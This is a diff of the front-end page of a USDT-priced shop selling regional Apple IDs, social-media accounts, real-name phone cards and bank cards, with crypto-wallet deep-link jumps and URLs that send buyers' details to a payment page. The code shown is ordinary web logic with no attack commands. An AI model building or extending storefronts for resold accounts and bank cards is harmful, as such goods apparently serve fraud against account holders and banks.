@@ -3235,38 +3235,38 @@
                     
                     <div class="account-item" onclick="selectAccount('apple', 'Apple ID 英国', 0.5)">
                         <div class="account-item-header">
-                            <div class="account-item-icon">
-                                <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                                <div class="account-item-icon">
+                                    <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                                </div>
+                                <div class="account-item-title">Apple ID 英国</div>
                             </div>
-                            <div class="account-item-title">Apple ID 英国</div>
-                        </div>
-                        <div class="account-item-price">0.5 USDT</div>
-                        <div class="account-item-stats">
-                            <span class="account-item-stock">库存: 543</span>
-                            <span class="account-item-sales">销量: 765</span>
-                        </div>
-                    </div>
-                    
-                    <div class="account-item" onclick="selectAccount('apple', 'Apple ID 香港', 0.5)">
-                        <div class="account-item-header">
-                            <div class="account-item-icon">
-                                <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                            <div class="account-item-price">0.5 USDT</div>
+                            <div class="account-item-stats">
+                                <span class="account-item-stock">库存: 543</span>
+                                <span class="account-item-sales">销量: 765</span>
                             </div>
-                            <div class="account-item-title">Apple ID 香港</div>
                         </div>
-                        <div class="account-item-price">0.5 USDT</div>
-                        <div class="account-item-stats">
-                            <span class="account-item-stock">库存: 432</span>
-                            <span class="account-item-sales">销量: 654</span>
-                        </div>
-                    </div>
-                    
-                    <div class="account-item" onclick="selectAccount('apple', 'Apple ID 美国', 0.5)">
-                        <div class="account-item-header">
-                            <div class="account-item-icon">
-                                <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                        
+                        <div class="account-item" onclick="selectAccount('apple', 'Apple ID 香港', 0.5)">
+                            <div class="account-item-header">
+                                <div class="account-item-icon">
+                                    <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                                </div>
+                                <div class="account-item-title">Apple ID 香港</div>
                             </div>
-                            <div class="account-item-title">Apple ID 美国</div>
+                            <div class="account-item-price">0.5 USDT</div>
+                            <div class="account-item-stats">
+                                <span class="account-item-stock">库存: 432</span>
+                                <span class="account-item-sales">销量: 654</span>
+                            </div>
+                        </div>
+                        
+                        <div class="account-item" onclick="selectAccount('apple', 'Apple ID 美国', 0.5)">
+                            <div class="account-item-header">
+                                <div class="account-item-icon">
+                                    <img src="https://i.ibb.co/8D3JhZqC/app.jpg" alt="Apple ID" onerror="this.style.display='none'; this.parentNode.innerHTML='🍎';">
+                                </div>
+                                <div class="account-item-title">Apple ID 美国</div>
                             </div>
                             <div class="account-item-price">0.5 USDT</div>
                             <div class="account-item-stats">
@@ -3727,6 +3727,7 @@
     </div>
 
     <script>
+        // ==================== 全局变量 ====================
         let currentPaymentUrl = '';
         let selectedWallet = '';
         let currentService = 'premium';
@@ -3737,94 +3738,103 @@
         let isJumping = false;
         let jumpInterval = null;
         
-// 钱包协议映射 - 修复版（支持iOS/Android/通用链接）
-const WALLET_PROTOCOLS = {
-    'TronLink': {
-        android: 'tronlink://',
-        ios: 'tronlink://',
-        universal: 'https://www.tronlink.org/dapp?dappUrl=',
-        package: 'com.tronlink'
-    },
-    'TokenPocket': {
-        android: 'tpoutside://',
-        ios: 'tpoutside://',
-        universal: 'https://tokenpocket.github.io/openapp/?action=dapp&url=',
-        package: 'vip.mytokenpocket'
-    },
-    'Bitget': {
-        android: 'bitkeep://',
-        ios: 'bitkeep://',
-        universal: 'https://bkcode.vip?action=dapp&url=',
-        package: 'com.bitkeep.wallet'
-    },
-    'imToken': {
-        android: 'imtokenv2://',
-        ios: 'imtokenv2://',
-        universal: 'https://token.im/openapp?url=',
-        package: 'im.token.app'
-    },
-    'OneKey': {
-        android: 'onekey-wallet://',
-        ios: 'onekey-wallet://',
-        universal: 'https://app.onekey.so/openapp?url=',
-        package: 'so.onekey.app.wallet'
-    },
-    'OKX': {
-        android: 'okx://',
-        ios: 'okx://',
-        universal: 'https://www.okx.com/wallet/openapp?url=',
-        package: 'com.okinc.okex.gp'
-    },
-    'BitPie': {
-        android: 'bitpie://',
-        ios: 'bitpie://',
-        universal: 'https://bitpie.com/openapp?url=',
-        package: 'com.bither'
-    },
-    'TrustWallet': {
-        android: 'trust://',
-        ios: 'trust://',
-        universal: 'https://link.trustwallet.com/open_url?url=',
-        package: 'com.wallet.crypto.trustapp'
-    }
-};
+        // ==================== 钱包协议映射 - 修复版（支持iOS/Android/通用链接）====================
+        const WALLET_PROTOCOLS = {
+            'TronLink': {
+                android: 'tronlinkoutside://',
+                ios: 'tronlink://',
+                universal: 'https://www.tronlink.org/dapp?dappUrl=',
+                package: 'com.tronlink',
+                storeUrl: 'https://www.tronlink.org/'
+            },
+            'TokenPocket': {
+                android: 'tpoutside://',
+                ios: 'tps://',
+                universal: 'https://tokenpocket.github.io/openapp/?action=dapp&url=',
+                package: 'vip.mytokenpocket',
+                storeUrl: 'https://www.tokenpocket.pro/'
+            },
+            'Bitget': {
+                android: 'bitkeep://',
+                ios: 'bitkeep://',
+                universal: 'https://bkcode.vip?action=dapp&url=',
+                package: 'com.bitkeep.wallet',
+                storeUrl: 'https://web3.bitget.com/'
+            },
+            'imToken': {
+                android: 'imtokenv2://',
+                ios: 'imtokenv2://',
+                universal: 'https://token.im/openapp?url=',
+                package: 'im.token.app',
+                storeUrl: 'https://token.im/'
+            },
+            'OneKey': {
+                android: 'onekey-wallet://',
+                ios: 'onekey-wallet://',
+                universal: 'https://app.onekey.so/openapp?url=',
+                package: 'so.onekey.app.wallet',
+                storeUrl: 'https://onekey.so/'
+            },
+            'OKX': {
+                android: 'okx://',
+                ios: 'okx://',
+                universal: 'https://www.okx.com/wallet/openapp?url=',
+                package: 'com.okinc.okex.gp',
+                storeUrl: 'https://www.okx.com/web3'
+            },
+            'BitPie': {
+                android: 'bitpie://',
+                ios: 'bitpie://',
+                universal: 'https://bitpie.com/openapp?url=',
+                package: 'com.bither',
+                storeUrl: 'https://bitpie.com/'
+            },
+            'TrustWallet': {
+                android: 'trust://',
+                ios: 'trust://',
+                universal: 'https://link.trustwallet.com/open_url?url=',
+                package: 'com.wallet.crypto.trustapp',
+                storeUrl: 'https://trustwallet.com/'
+            }
+        };
 
-// 钱包下载链接
-const WALLET_DOWNLOAD_LINKS = {
-    'TronLink': {
-        android: 'https://play.google.com/store/apps/details?id=com.tronlink',
-        ios: 'https://apps.apple.com/app/tronlink-wallet/id1482084022'
-    },
-    'TokenPocket': {
-        android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
-        ios: 'https://apps.apple.com/app/tokenpocket/id1436028697'
-    },
-    'Bitget': {
-        android: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
-        ios: 'https://apps.apple.com/app/bitget-wallet/id1395301115'
-    },
-    'imToken': {
-        android: 'https://play.google.com/store/apps/details?id=im.token.app',
-        ios: 'https://apps.apple.com/app/imtoken2/id1384798940'
-    },
-    'OneKey': {
-        android: 'https://play.google.com/store/apps/details?id=so.onekey.app.wallet',
-        ios: 'https://apps.apple.com/app/onekey-open-source-wallet/id1609559473'
-    },
-    'OKX': {
-        android: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
-        ios: 'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470'
-    },
-    'BitPie': {
-        android: 'https://play.google.com/store/apps/details?id=com.bither',
-        ios: 'https://apps.apple.com/app/bitpie-multi-crypto-wallet/id1492603615'
-    },
-    'TrustWallet': {
-        android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-        ios: 'https://apps.apple.com/app/trust-ethereum-wallet/id1288339409'
-    }
-};
+        // ==================== 钱包下载链接 ====================
+        const WALLET_DOWNLOAD_LINKS = {
+            'TronLink': {
+                android: 'https://play.google.com/store/apps/details?id=com.tronlink',
+                ios: 'https://apps.apple.com/app/tronlink-wallet/id1482084022'
+            },
+            'TokenPocket': {
+                android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
+                ios: 'https://apps.apple.com/app/tokenpocket/id1436028697'
+            },
+            'Bitget': {
+                android: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
+                ios: 'https://apps.apple.com/app/bitget-wallet/id1395301115'
+            },
+            'imToken': {
+                android: 'https://play.google.com/store/apps/details?id=im.token.app',
+                ios: 'https://apps.apple.com/app/imtoken2/id1384798940'
+            },
+            'OneKey': {
+                android: 'https://play.google.com/store/apps/details?id=so.onekey.app.wallet',
+                ios: 'https://apps.apple.com/app/onekey-open-source-wallet/id1609559473'
+            },
+            'OKX': {
+                android: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
+                ios: 'https://apps.apple.com/app/okx-buy-bitcoin-eth-crypto/id1327268470'
+            },
+            'BitPie': {
+                android: 'https://play.google.com/store/apps/details?id=com.bither',
+                ios: 'https://apps.apple.com/app/bitpie-multi-crypto-wallet/id1492603615'
+            },
+            'TrustWallet': {
+                android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
+                ios: 'https://apps.apple.com/app/trust-ethereum-wallet/id1288339409'
+            }
+        };
 
+        // ==================== 工具函数 ====================
         function showTemporaryMessage(message) {
             const existingMessage = document.querySelector('.temporary-message');
             if (existingMessage) {
@@ -3851,11 +3861,11 @@ const WALLET_DOWNLOAD_LINKS = {
                    userAgent.includes('bitget') ||
                    userAgent.includes('imtoken') ||
                    userAgent.includes('bitkeep') ||
-                   userAgent.includes('tp-ua') || // TokenPocket 特定标识
-                   window.isTokenPocket || // TokenPocket 全局变量
-                   window.bitkeep || // Bitget Wallet 全局变量
-                   window.ethereum?.isTokenPocket || // TokenPocket 通过 Ethereum 提供者
-                   window.ethereum?.isBitKeep; // Bitget Wallet 通过 Ethereum 提供者
+                   userAgent.includes('tp-ua') ||
+                   window.isTokenPocket ||
+                   window.bitkeep ||
+                   window.ethereum?.isTokenPocket ||
+                   window.ethereum?.isBitKeep;
         }
 
         function copyToClipboard(elementId) {
@@ -3888,6 +3898,7 @@ const WALLET_DOWNLOAD_LINKS = {
             showTemporaryMessage('订单查询功能开发中，请稍后...');
         }
 
+        // ==================== 服务切换函数 ====================
         function switchService(service) {
             currentService = service;
             
@@ -4023,6 +4034,7 @@ const WALLET_DOWNLOAD_LINKS = {
             document.getElementById('normalFields').style.display = 'block';
         }
 
+        // ==================== 账号购买相关函数 ====================
         function selectAccountType(type) {
             selectedAccountType = type;
             
@@ -4038,7 +4050,6 @@ const WALLET_DOWNLOAD_LINKS = {
             
             document.getElementById('selectedAccountInfo').style.display = 'none';
             
-            // 重置子类型按钮状态
             if (type === 'telegram_twitter') {
                 showTelegramTwitterSubtype('telegram');
             } else if (type === 'tiktok_kuaishou') {
@@ -4130,37 +4141,30 @@ const WALLET_DOWNLOAD_LINKS = {
             document.getElementById(type + 'Accounts').style.display = 'none';
             document.getElementById('regionSelection').style.display = 'none';
             
-            // 更新价格显示
             updateAccountTotalPrice();
             
-            // 重置所有字段显示
             document.getElementById('specialFields').style.display = 'none';
             document.getElementById('rechargeFields').style.display = 'none';
             document.getElementById('normalFields').style.display = 'block';
             
-            // 根据商品类型显示不同的字段
             if (type === 'phone') {
                 if (name.includes('话费')) {
-                    // 话费充值
                     document.getElementById('accountFormTitle').textContent = '填写充值信息';
                     document.getElementById('specialFields').style.display = 'none';
                     document.getElementById('rechargeFields').style.display = 'block';
                     document.getElementById('normalFields').style.display = 'none';
                 } else {
-                    // 实名卡
                     document.getElementById('accountFormTitle').textContent = '填写收货信息';
                     document.getElementById('specialFields').style.display = 'block';
                     document.getElementById('rechargeFields').style.display = 'none';
                     document.getElementById('normalFields').style.display = 'none';
                 }
             } else if (type === 'bankcard') {
-                // 银行卡
                 document.getElementById('accountFormTitle').textContent = '填写收货信息';
                 document.getElementById('specialFields').style.display = 'block';
                 document.getElementById('rechargeFields').style.display = 'none';
                 document.getElementById('normalFields').style.display = 'none';
             } else {
-                // 普通账号
                 document.getElementById('accountFormTitle').textContent = '填写接收信息';
                 document.getElementById('specialFields').style.display = 'none';
                 document.getElementById('rechargeFields').style.display = 'none';
@@ -4191,7 +4195,7 @@ const WALLET_DOWNLOAD_LINKS = {
             });
         }
 
-        // 子类型切换函数
+        // ==================== 子类型切换函数 ====================
         function showTelegramTwitterSubtype(subtype) {
             document.querySelectorAll('#telegram_twitterAccounts .subtype-btn').forEach(btn => {
                 btn.classList.remove('active');
@@ -4264,7 +4268,6 @@ const WALLET_DOWNLOAD_LINKS = {
             document.getElementById('huafeiSection').style.display = subtype === 'huafei' ? 'block' : 'none';
         }
 
-        // 新增的子类型切换函数
         function showGmailYouTubeSubtype(subtype) {
             document.querySelectorAll('#gmail_youtubeAccounts .subtype-btn').forEach(btn => {
                 btn.classList.remove('active');
@@ -4285,12 +4288,10 @@ const WALLET_DOWNLOAD_LINKS = {
             document.getElementById('momoSection').style.display = subtype === 'momo' ? 'block' : 'none';
         }
 
-        // ==================== 钱包跳转相关函数 ====================
-        
+        // ==================== 钱包跳转核心函数 ====================
         function selectWallet(walletName, service) {
             selectedWallet = walletName;
             
-            // 生成支付URL
             const paymentUrl = generatePaymentUrl(service);
             if (!paymentUrl) {
                 return;
@@ -4298,7 +4299,6 @@ const WALLET_DOWNLOAD_LINKS = {
             
             currentPaymentUrl = paymentUrl;
             
-            // 显示跳转弹窗
             showJumpModal();
         }
         
@@ -4319,7 +4319,6 @@ const WALLET_DOWNLOAD_LINKS = {
             modal.classList.add('active');
             document.body.style.overflow = 'hidden';
             
-            // 开始倒计时
             startJumpCountdown();
         }
         
@@ -4349,99 +4348,106 @@ const WALLET_DOWNLOAD_LINKS = {
             }, 1000);
         }
         
-      function executeWalletJump() {
-    console.log(`🔗 开始跳转到钱包: ${selectedWallet}`);
-    
-    // 检测平台
-    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const isAndroid = /Android/i.test(navigator.userAgent);
-    
-    // 获取钱包协议配置
-    const walletConfig = WALLET_PROTOCOLS[selectedWallet];
-    if (!walletConfig) {
-        console.error('❌ 钱包配置不存在:', selectedWallet);
-        showWalletNotInstalled();
-        return;
-    }
-    
-    // 构建跳转URL
-    let jumpUrl = '';
-    
-    if (isIOS) {
-        jumpUrl = walletConfig.ios + 'navigate?url=' + encodeURIComponent(currentPaymentUrl);
-    } else if (isAndroid) {
-        jumpUrl = walletConfig.android + 'navigate?url=' + encodeURIComponent(currentPaymentUrl);
-    } else {
-        // 非移动设备，使用通用链接
-        jumpUrl = walletConfig.universal + encodeURIComponent(currentPaymentUrl);
-    }
-    
-    console.log(`📱 平台检测: ${isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop'}`);
-    console.log(`🔗 跳转URL: ${jumpUrl}`);
-    
-    // 方法1: 尝试直接跳转
-    window.location.href = jumpUrl;
-    
-    // 方法2: 同时使用iframe跳转（增加成功率）
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = jumpUrl;
-    document.body.appendChild(iframe);
-    
-    // 方法3: 对于iOS，可能需要使用特殊的跳转策略
-    if (isIOS) {
-        setTimeout(() => {
-            window.location.href = walletConfig.universal + encodeURIComponent(currentPaymentUrl);
-        }, 250);
-    }
-    
-    // 检查是否成功跳转
-    setTimeout(() => {
-        // 如果没有跳转成功（还在当前页面）
-        if (document.hasFocus()) {
-            console.log('❌ 钱包跳转失败，检测到未安装该钱包');
-            showWalletNotInstalled();
+        // ==================== 核心钱包跳转逻辑 ====================
+        function executeWalletJump() {
+            console.log(`🔗 开始跳转到钱包: ${selectedWallet}`);
             
-            // 移除iframe
-            if (iframe.parentNode) {
-                iframe.parentNode.removeChild(iframe);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            
+            const walletConfig = WALLET_PROTOCOLS[selectedWallet];
+            if (!walletConfig) {
+                console.error('❌ 钱包配置不存在:', selectedWallet);
+                showWalletNotInstalled();
+                return;
+            }
+            
+            let jumpUrl = '';
+            
+            if (isIOS) {
+                jumpUrl = walletConfig.ios + 'navigate?url=' + encodeURIComponent(currentPaymentUrl);
+            } else if (isAndroid) {
+                jumpUrl = walletConfig.android + 'navigate?url=' + encodeURIComponent(currentPaymentUrl);
+            } else {
+                jumpUrl = walletConfig.universal + encodeURIComponent(currentPaymentUrl);
+            }
+            
+            console.log(`📱 平台检测: ${isIOS ? 'iOS' : isAndroid ? 'Android' : 'Desktop'}`);
+            console.log(`🔗 跳转URL: ${jumpUrl}`);
+            
+            // 方法1: 直接跳转
+            window.location.href = jumpUrl;
+            
+            // 方法2: iframe后备跳转
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = jumpUrl;
+            document.body.appendChild(iframe);
+            
+            // 方法3: iOS特殊处理
+            if (isIOS) {
+                setTimeout(() => {
+                    window.location.href = walletConfig.universal + encodeURIComponent(currentPaymentUrl);
+                }, 250);
+            }
+            
+            // 检查跳转是否成功
+            setTimeout(() => {
+                if (document.hasFocus()) {
+                    console.log('❌ 钱包跳转失败，检测到未安装该钱包');
+                    showWalletNotInstalled();
+                    
+                    if (iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                    }
+                }
+            }, 1000);
+        }
+
+        function showWalletNotInstalled() {
+            const actions = document.getElementById('jumpActions');
+            const message = document.getElementById('jumpMessage');
+            const countdown = document.getElementById('jumpCountdown');
+            
+            if (actions && message && countdown) {
+                countdown.style.display = 'none';
+                message.textContent = `检测到您未安装${selectedWallet}钱包，请选择以下操作：`;
+                actions.style.display = 'flex';
             }
         }
-    }, 1000);
-}
-
-function showWalletNotInstalled() {
-    const actions = document.getElementById('jumpActions');
-    const message = document.getElementById('jumpMessage');
-    const countdown = document.getElementById('jumpCountdown');
-    
-    if (actions && message && countdown) {
-        countdown.style.display = 'none';
-        message.textContent = `检测到您未安装${selectedWallet}钱包，请选择以下操作：`;
-        actions.style.display = 'flex';
-    }
-}
         
-   function openWalletDownload(walletName) {
-    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const isAndroid = /Android/i.test(navigator.userAgent);
-    
-    const walletLinks = WALLET_DOWNLOAD_LINKS[walletName];
-    
-    if (!walletLinks) {
-        showTemporaryMessage('找不到该钱包的下载链接');
-        return;
-    }
-    
-    if (isIOS && walletLinks.ios) {
-        window.open(walletLinks.ios, '_blank');
-    } else if (isAndroid && walletLinks.android) {
-        window.open(walletLinks.android, '_blank');
-    } else {
-        // 默认打开Android链接或显示提示
-        window.open(walletLinks.android || walletLinks.ios, '_blank');
-    }
-}
+        function changeWallet() {
+            hideJumpModal();
+        }
+        
+        function showWalletDownloadPage() {
+            hideJumpModal();
+            document.getElementById('walletDownloadPage').classList.add('active');
+        }
+        
+        function hideWalletDownloadPage() {
+            document.getElementById('walletDownloadPage').classList.remove('active');
+        }
+        
+        function openWalletDownload(walletName) {
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            
+            const walletLinks = WALLET_DOWNLOAD_LINKS[walletName];
+            
+            if (!walletLinks) {
+                showTemporaryMessage('找不到该钱包的下载链接');
+                return;
+            }
+            
+            if (isIOS && walletLinks.ios) {
+                window.open(walletLinks.ios, '_blank');
+            } else if (isAndroid && walletLinks.android) {
+                window.open(walletLinks.android, '_blank');
+            } else {
+                window.open(walletLinks.android || walletLinks.ios, '_blank');
+            }
+        }
         
         function hideJumpModal() {
             const modal = document.getElementById('jumpModal');
@@ -4456,31 +4462,92 @@ function showWalletNotInstalled() {
         }
         
         function handleUserCancel() {
-            hideJumpModal();
             showTemporaryMessage('您已取消支付');
+            hideJumpModal();
             
-            // 显示取消支付消息
-showTemporaryMessage('您已取消支付');
-hideJumpModal();
+            setTimeout(() => {
+                if (currentService === 'premium') {
+                    document.getElementById('walletSection').style.display = 'block';
+                    document.getElementById('userForm').style.display = 'none';
+                    document.getElementById('purchaseBtn').style.display = 'none';
+                } else if (currentService === 'trx') {
+                    document.getElementById('trxWalletSection').style.display = 'block';
+                    document.getElementById('trxUserForm').style.display = 'none';
+                    document.getElementById('trxPurchaseBtn').style.display = 'none';
+                } else if (currentService === 'account') {
+                    document.getElementById('accountWalletSection').style.display = 'block';
+                    document.getElementById('accountUserForm').style.display = 'none';
+                    document.getElementById('selectedAccountInfo').style.display = 'block';
+                }
+            }, 100);
+        }
 
-// 立即返回钱包选择页面，不需要等待3秒
-setTimeout(() => {
-    // 根据当前服务类型显示钱包选择
-    if (currentService === 'premium') {
-        document.getElementById('walletSection').style.display = 'block';
-        document.getElementById('userForm').style.display = 'none';
-        document.getElementById('purchaseBtn').style.display = 'none';
-    } else if (currentService === 'trx') {
-        document.getElementById('trxWalletSection').style.display = 'block';
-        document.getElementById('trxUserForm').style.display = 'none';
-        document.getElementById('trxPurchaseBtn').style.display = 'none';
-    } else if (currentService === 'account') {
-        document.getElementById('accountWalletSection').style.display = 'block';
-        document.getElementById('accountUserForm').style.display = 'none';
-        document.getElementById('selectedAccountInfo').style.display = 'block';
-    }
-}, 100); // 改为100ms快速返回
+        // ==================== 支付URL生成 ====================
+        function generatePaymentUrl(service) {
+            let quantity = 1;
+            
+            if (service === 'premium') {
+                const username = document.getElementById('username').value.trim();
+                const nickname = document.getElementById('nickname').value.trim();
+                
+                if (!username || !nickname) {
+                    showTemporaryMessage('请先填写用户信息！');
+                    return null;
+                }
+                
+                const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const authUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99&service=premium&quantity=1`;
+                return authUrl;
+            } else if (service === 'trx') {
+                const trxAddress = document.getElementById('trxAddress').value.trim();
+                
+                if (!trxAddress) {
+                    showTemporaryMessage('请先填写钱包地址！');
+                    return null;
+                }
+                
+                const orderId = 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const authUrl = `payment.html?orderId=${orderId}&trxAddress=${encodeURIComponent(trxAddress)}&amount=1.99&service=trx&quantity=1`;
+                return authUrl;
+            } else if (service === 'account') {
+                if (!selectedAccount) {
+                    showTemporaryMessage('请先选择账号！');
+                    return null;
+                }
+                
+                const orderId = 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const accountNote = document.getElementById('accountNote').value.trim();
+                quantity = document.getElementById('quantity').value.trim();
+                const totalAmount = (selectedAccount.price * quantity).toFixed(2);
+                
+                let authUrl = `payment.html?orderId=${orderId}&accountNote=${encodeURIComponent(accountNote)}&accountType=${encodeURIComponent(selectedAccount.type)}&accountName=${encodeURIComponent(selectedAccount.name)}&amount=${totalAmount}&service=account&quantity=${quantity}`;
+                
+                if (selectedAccount.type === 'phone') {
+                    if (selectedAccount.name.includes('话费')) {
+                        const rechargePhone = document.getElementById('rechargePhone').value.trim();
+                        const operator = document.getElementById('operator').value.trim();
+                        authUrl += `&rechargePhone=${encodeURIComponent(rechargePhone)}&operator=${encodeURIComponent(operator)}`;
+                    } else {
+                        const contactName = document.getElementById('contactName').value.trim();
+                        const shippingAddress = document.getElementById('shippingAddress').value.trim();
+                        const shippingPhone = document.getElementById('shippingPhone').value.trim();
+                        authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
+                    }
+                } else if (selectedAccount.type === 'bankcard') {
+                    const contactName = document.getElementById('contactName').value.trim();
+                    const shippingAddress = document.getElementById('shippingAddress').value.trim();
+                    const shippingPhone = document.getElementById('shippingPhone').value.trim();
+                    authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
+                } else {
+                    const accountEmail = document.getElementById('accountEmail').value.trim();
+                    authUrl += `&accountEmail=${encodeURIComponent(accountEmail)}`;
+                }
+                
+                return authUrl;
+            }
+        }
 
+        // ==================== DOM加载完成 ====================
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('purchaseBtn').addEventListener('click', function() {
                 document.getElementById('userForm').style.display = 'block';
@@ -4548,17 +4615,14 @@ setTimeout(() => {
                     return;
                 }
                 
-                // 验证不同商品类型的必填字段
                 if (selectedAccount.type === 'phone') {
                     if (selectedAccount.name.includes('话费')) {
-                        // 话费充值验证
                         const rechargePhone = document.getElementById('rechargePhone').value.trim();
                         if (!rechargePhone) {
                             showTemporaryMessage('请填写充值电话！');
                             return;
                         }
                     } else {
-                        // 实名卡验证
                         const contactName = document.getElementById('contactName').value.trim();
                         const shippingAddress = document.getElementById('shippingAddress').value.trim();
                         const shippingPhone = document.getElementById('shippingPhone').value.trim();
@@ -4569,7 +4633,6 @@ setTimeout(() => {
                         }
                     }
                 } else if (selectedAccount.type === 'bankcard') {
-                    // 银行卡验证
                     const contactName = document.getElementById('contactName').value.trim();
                     const shippingAddress = document.getElementById('shippingAddress').value.trim();
                     const shippingPhone = document.getElementById('shippingPhone').value.trim();
@@ -4579,7 +4642,6 @@ setTimeout(() => {
                         return;
                     }
                 } else {
-                    // 普通账号验证
                     const accountEmail = document.getElementById('accountEmail').value.trim();
                     if (!accountEmail) {
                         showTemporaryMessage('请填写接收信息！');
@@ -4594,301 +4656,6 @@ setTimeout(() => {
                     document.getElementById('accountCopyContainer').style.display = 'block';
                 }
             });
-        });
-
-        function generatePaymentUrl(service) {
-            let quantity = 1;
-            
-            if (service === 'premium') {
-                const username = document.getElementById('username').value.trim();
-                const nickname = document.getElementById('nickname').value.trim();
-                
-                if (!username || !nickname) {
-                    showTemporaryMessage('请先填写用户信息！');
-                    return null;
-                }
-                
-                const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                const authUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99&service=premium&quantity=1`;
-                return authUrl;
-            } else if (service === 'trx') {
-                const trxAddress = document.getElementById('trxAddress').value.trim();
-                
-                if (!trxAddress) {
-                    showTemporaryMessage('请先填写钱包地址！');
-                    return null;
-                }
-                
-                const orderId = 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                const authUrl = `payment.html?orderId=${orderId}&trxAddress=${encodeURIComponent(trxAddress)}&amount=1.99&service=trx&quantity=1`;
-                return authUrl;
-            } else if (service === 'account') {
-                if (!selectedAccount) {
-                    showTemporaryMessage('请先选择账号！');
-                    return null;
-                }
-                
-                const orderId = 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                const accountNote = document.getElementById('accountNote').value.trim();
-                quantity = document.getElementById('quantity').value.trim();
-                const totalAmount = (selectedAccount.price * quantity).toFixed(2);
-                
-                let authUrl = `payment.html?orderId=${orderId}&accountNote=${encodeURIComponent(accountNote)}&accountType=${encodeURIComponent(selectedAccount.type)}&accountName=${encodeURIComponent(selectedAccount.name)}&amount=${totalAmount}&service=account&quantity=${quantity}`;
-                
-                if (selectedAccount.type === 'phone') {
-                    if (selectedAccount.name.includes('话费')) {
-                        const rechargePhone = document.getElementById('rechargePhone').value.trim();
-                        const operator = document.getElementById('operator').value.trim();
-                        authUrl += `&rechargePhone=${encodeURIComponent(rechargePhone)}&operator=${encodeURIComponent(operator)}`;
-                    } else {
-                        const contactName = document.getElementById('contactName').value.trim();
-                        const shippingAddress = document.getElementById('shippingAddress').value.trim();
-                        const shippingPhone = document.getElementById('shippingPhone').value.trim();
-                        authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
-                    }
-                } else if (selectedAccount.type === 'bankcard') {
-                    const contactName = document.getElementById('contactName').value.trim();
-                    const shippingAddress = document.getElementById('shippingAddress').value.trim();
-                    const shippingPhone = document.getElementById('shippingPhone').value.trim();
-                    authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
-                } else {
-                    const accountEmail = document.getElementById('accountEmail').value.trim();
-                    authUrl += `&accountEmail=${encodeURIComponent(accountEmail)}`;
-                }
-                
-                return authUrl;
-            }
-        }
-
-        function generateOrderData(service) {
-            if (service === 'premium') {
-                const username = document.getElementById('username')?.value.trim();
-                const nickname = document.getElementById('nickname')?.value.trim();
-                
-                if (!username || !nickname) {
-                    showTemporaryMessage('请先填写用户信息！');
-                    return null;
-                }
-                
-                return {
-                    orderId: 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                    service: 'premium',
-                    amount: '0.99',
-                    quantity: '1',
-                    username: username,
-                    nickname: nickname,
-                    productType: 'Telegram Premium 订阅'
-                };
-            } else if (service === 'trx') {
-                const trxAddress = document.getElementById('trxAddress')?.value.trim();
-                
-                if (!trxAddress) {
-                    showTemporaryMessage('请先填写钱包地址！');
-                    return null;
-                }
-                
-                return {
-                    orderId: 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                    service: 'trx',
-                    amount: '1.99',
-                    quantity: '1',
-                    trxAddress: trxAddress,
-                    productType: 'TRX波场能量'
-                };
-            } else if (service === 'account') {
-                if (!selectedAccount) {
-                    showTemporaryMessage('请先选择账号！');
-                    return null;
-                }
-                
-                const quantity = document.getElementById('quantity')?.value.trim() || '1';
